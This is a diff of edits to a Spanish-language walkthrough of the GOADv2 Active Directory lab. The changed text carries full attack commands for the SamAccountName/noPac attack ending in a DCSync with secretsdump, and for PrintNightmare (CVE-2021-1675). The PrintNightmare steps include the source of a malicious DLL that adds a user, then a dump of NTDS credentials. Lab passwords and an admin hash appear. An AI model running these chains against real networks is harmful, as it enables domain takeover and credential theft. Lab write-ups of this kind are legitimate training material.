@@ -2003,7 +2003,7 @@ Impacket v0.10.1.dev1+20230728.114623.fb147c3f - Copyright 2022 Fortra
 [*] Successfully added machine account samaccountname$ with password ComputerPassword.
 ```
 
-Borrar las SPNs de nuestro nuevo ordenador  (con dirkjan [krbrelayx](https://github.com/dirkjanm/krbrelayx) tool addspn) nos clonamos el repositorio con el comando `git clone https://github.com/dirkjanm/krbrelayx.git`
+Borrar las SPNs de nuestro nuevo ordenador  (con dirkjan [krbrelayx](https://github.com/dirkjanm/krbrelayx){:target="_blank"}  tool addspn) nos clonamos el repositorio con el comando `git clone https://github.com/dirkjanm/krbrelayx.git`
 
 ```csharp
 ┌─[root@angussmoody]─[/mnt/angussMoody/Scripts]
@@ -2024,7 +2024,7 @@ ahora ingresamos al directorio con el comando `cd krbrelayx/`
 └──╼ #cd krbrelayx/
 ```
 
-ahora ejecutamos la herramienta addspn.py con el comando `python3 addspn.py -h`
+Ejecutamos la herramienta addspn.py con el comando `python3 addspn.py -h`
 
 ```csharp
 ┌─[root@angussmoody]─[/mnt/angussMoody/Scripts/krbrelayx]
@@ -2077,7 +2077,7 @@ DN: CN=samaccountname,CN=Computers,DC=north,DC=sevenkingdoms,DC=local - STATUS: 
 [+] SPN Modified successfully
 ```
 
-Ahora vamos a cambiar el nombre del ordenador por el del DC con el comando
+Vamos a cambiar el nombre del ordenador por el del DC con el comando
 
 `renameMachine.py -current-name 'samaccountname$' -new-name 'winterfell' -dc-ip 'winterfell.north.sevenkingdoms.local' north.sevenkingdoms.local/jon.snow:iknownothing`
 
@@ -2112,7 +2112,7 @@ Permissions Size User Date Modified Name
 .rw-r--r--  1,4k root 30 jul 18:42  winterfell.ccache
 ```
 
-y ahora vamos a restablecer el nombre del ordenador al nombre original con el comando}
+y ahora vamos a restablecer el nombre del ordenador al nombre original con el comando
 
 `renameMachine.py -current-name 'winterfell' -new-name 'samaccount$' north.sevenkingdoms.local/jon.snow:iknownothing`
 
@@ -2225,7 +2225,7 @@ Permissions Size User Date Modified Name
 .rw-r--r--  1,6k root 30 jul 18:48  administrator@CIFS_winterfell.north.sevenkingdoms.local@NORTH.SEVENKINGDOMS.LOCAL.ccache
 ```
 
-Ahora vamos a realizar el ataque DCSync presentando el ticket de servicio, exportamos este ticket con el comando
+Vamos a realizar el ataque DCSync presentando el ticket de servicio, exportamos este ticket con el comando
 
 `export KRB5CCNAME=/workspace/administrator@CIFS_winterfell.north.sevenkingdoms.local@NORTH.SEVENKINGDOMS.LOCAL.ccache`
 
@@ -2234,7 +2234,7 @@ Ahora vamos a realizar el ataque DCSync presentando el ticket de servicio, expor
 └──╼ #export KRB5CCNAME=/opt/myimpacket/administrator@CIFS_winterfell.north.sevenkingdoms.local@NORTH.SEVENKINGDOMS.LOCAL.ccache
 ```
 
-y ahora podemos ejecutar la herramienta secretdump con el comando
+y ya podemos ejecutar la herramienta secretdump con el comando
 
 `secretsdump.py -k -no-pass -dc-ip 'winterfell.north.sevenkingdoms.local' @'winterfell.north.sevenkingdoms.local'`
 
@@ -2378,7 +2378,7 @@ KeyError: 'Cryptodome.Cipher.AES'
 
 Y así, tenemos toda la información sobre el dominio norte ntds.dit
 
-Ahora vamos a limpia borrando el equipo que hemos creado con el hash de la cuenta de administrador que acabamos de obtener con el comando
+por último vamos a limpia, borrando el equipo que hemos creado con el hash de la cuenta de administrador que acabamos de obtener con el comando
 
 `addcomputer.py -computer-name 'samaccountname$' -delete -dc-host winterfell.north.sevenkingdoms.local -domain-netbios NORTH -hashes 'aad3b435b51404eeaad3b435b51404ee:dbd13e1c4e338284ac4e9874f7de6ef4' 'north.sevenkingdoms.local/Administrator'`
 
@@ -2394,7 +2394,7 @@ Impacket v0.10.1.dev1+20230728.114623.fb147c3f - Copyright 2022 Fortra
 
 ## PrintNightmare Windows Server 2016
 
-Para explotar printnightmare primero comprobaremos si el spooler está activo en los objetivos, esto lo hacemos con el comando `cme smb 192.168.56.10-23 -M spooler para este ataque utilizaremos las credenciales del usuario `jorah.mormont con la contraseña H0nnor!
+Para explotar printnightmare primero comprobaremos si el spooler está activo en los objetivos, esto lo hacemos con el comando `cme smb 192.168.56.10-23 -M spooler` para este ataque utilizaremos las credenciales del usuario jorah.mormont con la contraseña H0nnor!
 
 ```csharp
 ┌─[root@angussmoody]─[/mnt/angussMoody/Goadv2]
@@ -2412,7 +2412,7 @@ SPOOLER     192.168.56.12   445    MEEREEN          Spooler service enabled
 Running CME against 14 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% 0:00:00
 ```
 
-Ahora con el comando [rpcdump.py](http://rpcdump.py/) @192.168.56.10 | egrep 'MS-RPRN|MS-PAR'
+Ahora con el comando `rpcdump.py @192.168.56.10 | egrep 'MS-RPRN|MS-PAR'`
 
 ```csharp
 ┌─[root@angussmoody]─[/mnt/angussMoody/Goadv2]
@@ -2437,7 +2437,7 @@ Protocol: [MS-PAR]: Print System Asynchronous Remote Protocol
 Protocol: [MS-RPRN]: Print System Remote Protocol
 ```
 
-Ahora vamos a preparar un archivo dll para realizar la explotación, esto lo vamos a hacer con un archivo llamado nightmare.c aunque podríamos ponerle cualquier nombre, pero para este caso vamos a dejar el que tiene la guía de [GOAD](https://mayfly277.github.io/posts/GOADv2-pwning-part5/#printnightmare)
+Vamos a preparar un archivo dll para realizar la explotación, esto lo vamos a hacer con un archivo llamado nightmare.c aunque podríamos ponerle cualquier nombre, pero para este caso vamos a dejar el que tiene la guía de [GOAD](https://mayfly277.github.io/posts/GOADv2-pwning-part5/#printnightmare){:target="_blank"} para este ejemplo, modifico el archivo para crear un usuario llamado angussmoody
 
 ```c
 #include <windows.h> 
@@ -2468,7 +2468,7 @@ BOOL APIENTRY DllMain(HMODULE hModule,
 }
 ```
 
-Vamos a archivo con el comando `x86_64-w64-mingw32-gcc -shared -o nightmare.dll nightmare.c`
+Vamos a compilar el archivo con el comando `x86_64-w64-mingw32-gcc -shared -o nightmare.dll nightmare.c`
 
 ```csharp
 ┌─[root@angussmoody]─[/mnt/angussMoody/Goadv2]
@@ -2480,7 +2480,7 @@ Permissions Size User        Date Modified Name
 .rwxrwxrwx   91k angussmoody 15 ago 20:00  nightmare.dll
 ```
 
-Nos vamos a clonar el script de cube0x0 que tiene en su [github](https://github.com/cube0x0/CVE-2021-1675) para realizar este ataque, esto lo hacemos con el comando `git clone https://github.com/cube0x0/CVE-2021-1675 printnightmare una vez termina de correr el comando vemos que tenemos un directorio con el script en python`
+Ahora vamos a clonar el script de cube0x0 que tiene en su [github](https://github.com/cube0x0/CVE-2021-1675){:target="_blank"}  para realizar este ataque, esto lo hacemos con el comando `git clone https://github.com/cube0x0/CVE-2021-1675 printnightmare` una vez termina de correr el comando vemos que tenemos un directorio con el script en python
 
 ```csharp
 ┌─[root@angussmoody]─[/mnt/angussMoody/Goadv2]
@@ -2502,7 +2502,7 @@ drwxrwxrwx     - angussmoody 15 ago 20:06  Images
 drwxrwxrwx     - angussmoody 15 ago 20:06  SharpPrintNightmare
 ```
 
-vamos a preparar un recurso compartido smb con la dll vemos que lo tenemos en el directorio que vamos a exponer, ahora con el comando `smbserver.py -smb2support share` . nos creamos el recurso compartido
+vamos a preparar un recurso compartido smb en el directorio donde tenemos el archivo dll, ahora con el comando `smbserver.py -smb2support share .` nos creamos el recurso compartido
 
 ```csharp
 ┌─[root@angussmoody]─[/mnt/angussMoody/Goadv2]
@@ -2565,7 +2565,7 @@ Example;
 
 ```
 
-ahora que sabemos que el comando corre vamos a realizar el ataque contra essos.local que responde a la IP 192.168.56.12 y podemos ver que es un Windows Server 2016 Standard Evaluation 14393 x64
+ahora que sabemos que el script corre sin problemas, vamos a realizar el ataque contra essos.local que responde a la IP 192.168.56.12 y podemos ver que es un Windows Server 2016 Standard Evaluation 14393 x64
 
 ```csharp
 ┌─[root@angussmoody]─[/mnt/angussMoody/Goadv2/printnightmare]
@@ -2573,7 +2573,7 @@ ahora que sabemos que el comando corre vamos a realizar el ataque contra essos.l
 SMB         essos.local     445    MEEREEN          [*] Windows Server 2016 Standard Evaluation 14393 x64 (name:MEEREEN) (domain:essos.local) (signing:True) (SMBv1:True)
 ```
 
-ahora vamos a correr el script con el comando `python3 CVE-2021-1675.py essos.local/jorah.mormont:'H0nnor!'@meereen.essos.local '\\192.168.56.104\share\nightmare.dll'` para este caso 192.168.56.104 es la IP que me entrega el laboratorio y  share es el nombre que le puse al recurso compartido, y vemos que nos dice que el exploit Completed (Explotación finalizada)
+Corremos el script con el comando `python3 CVE-2021-1675.py essos.local/jorah.mormont:'H0nnor!'@meereen.essos.local '\\192.168.56.104\share\nightmare.dll'` para este caso 192.168.56.104 es la IP que me entrega el laboratorio y  share es el nombre que le puse al recurso compartido, vemos que nos dice exploit Completed (Explotación finalizada)
 
 ```csharp
 ┌─[root@angussmoody]─[/mnt/angussMoody/Goadv2/printnightmare]
@@ -2615,7 +2615,7 @@ Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
 [*] Remaining connections []
 ```
 
-Ahora vamos a comprobar con crackmapexec si se realizó la creación de el usuario con el comando  cme smb meereen.essos.local -u angussmoody -p 'Passw0rd123.' y vemos que este ya nos responde y nos da la etiqueta (Pwn3d!) lo cual podemos aprovechar para ejecutar comando o en este caso realizar un volcado del archivo NTDS. dit  (NT Directory Services Database) es el archivo de base de datos principal utilizado por el servicio Active Directory en los sistemas operativos Windows Server
+Ahora vamos a comprobar con crackmapexec si se realizó la creación de el usuario con el comando  `cme smb meereen.essos.local -u angussmoody -p 'Passw0rd123.'` y vemos que este ya nos responde y nos da la etiqueta (Pwn3d!) lo cual podemos aprovechar para ejecutar comandos o en este caso realizar un volcado del archivo NTDS. dit  (NT Directory Services Database) es el archivo de base de datos principal utilizado por el servicio Active Directory en los sistemas operativos Windows Server
 
 ```csharp
 ┌─[root@angussmoody]─[/mnt/angussMoody/Goadv2/printnightmare]
@@ -2624,7 +2624,7 @@ SMB         essos.local     445    MEEREEN          [*] Windows Server 2016 Stan
 SMB         essos.local     445    MEEREEN          [+] essos.local\angussmoody:Passw0rd123. (Pwn3d!)
 ```
 
-con la herramienta crackmapexec podemos realizar este volcado, aunque también hay otras herramientas como secretsdump.py Herramienta utilizada en el anterior ataque llamado [SamAccountName (nopac)](https://www.notion.so/o/sXxBpNeCw0DhoY0ohgUJ/s/xRLIXi9UGNqyXTLpBX40/~/changes/11/#samaccountname-nopac) para este caso vamos a hacerlo con crackmapexec con el comando `cme smb meereen.essos.local -u angussmoody -p 'Passw0rd123.' --ntds`
+con la herramienta crackmapexec podemos realizar este volcado, aunque también hay otras herramientas como secretsdump.py Herramienta utilizada en el anterior ataque llamado [SamAccountName (nopac)](https://angussmoody.github.io/active_directory/Solucion_GOADv2/#samaccountname-nopac) para este caso vamos a hacerlo con crackmapexec con el comando `cme smb meereen.essos.local -u angussmoody -p 'Passw0rd123.' --ntds`
 
 ```csharp
 ┌─[root@angussmoody]─[/mnt/angussMoody/Goadv2/printnightmare]
